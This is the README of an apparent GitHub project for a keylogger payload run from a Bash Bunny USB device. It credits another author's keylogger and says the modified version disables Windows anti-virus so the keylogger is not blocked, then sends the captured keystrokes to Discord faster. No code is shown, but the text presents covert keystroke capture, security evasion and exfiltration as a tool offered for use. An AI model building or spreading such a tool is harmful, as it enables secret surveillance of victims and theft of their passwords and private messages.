# Bash-Bunny-keylogger
This script was 90% made by blue c0sm0, https://github.com/CosmodiumCS/DucKeyhook, go check him out. Before I made changes, anti-virus would flag this keylogger and not allow the keylogger to run. I changed it so this script will disable windows anti-virus and send the keys to the discord a little faster.
